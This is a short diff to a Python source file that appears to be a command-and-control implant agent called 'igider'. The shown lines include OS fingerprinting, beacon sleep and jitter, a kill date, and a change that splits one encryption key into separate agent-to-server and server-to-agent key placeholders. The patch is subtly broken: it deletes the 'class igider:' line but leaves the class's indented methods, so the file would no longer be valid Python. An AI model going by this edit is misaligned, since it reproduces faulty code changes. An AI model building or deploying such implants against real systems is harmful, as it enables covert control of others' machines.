@@ -17,7 +17,6 @@ CHUNK_SIZE = 51200
 
 CRYPTO_MODULE_PLACEHOLDER
 
-class igider:
     def getOSVersion(self):
         if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
         else: return platform.system() + " " + platform.release()
@@ -290,7 +289,8 @@ class igider:
             "Sleep": callback_interval,
             "Jitter": callback_jitter,
             "KillDate": "killdate",
-            "enc_key": TRANSLATOR_KEYS,  # This should be injected from translator, NOT AESPSK
+            "agent_to_server_key": "AGENT_TO_SERVER_KEY",
+            "server_to_agent_key": "SERVER_TO_AGENT_KEY",
             "ExchChk": "encrypted_exchange_check",
             "GetURI": "/get_uri",
             "GetParam": "query_path_name",
